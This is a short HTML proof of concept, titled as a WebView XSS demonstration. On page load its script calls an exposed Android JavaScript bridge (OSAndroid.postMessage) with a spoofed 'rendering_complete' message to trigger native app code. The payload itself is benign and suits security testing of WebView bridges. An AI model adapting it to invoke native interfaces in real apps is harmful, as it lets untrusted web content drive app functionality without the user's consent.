<!DOCTYPE html>
<html>
  <head>
    <title>WebView XSS PoC</title>
    <script>
      window.onload = function () {
        if (window.OSAndroid && OSAndroid.postMessage) {
          OSAndroid.postMessage(JSON.stringify({
            type: "rendering_complete"
          }));
        } else {
          alert("OSAndroid interface not available");
        }
      };
    </script>
  </head>
  <body>
    <h1>Triggering native code...</h1>
  </body>
</html>
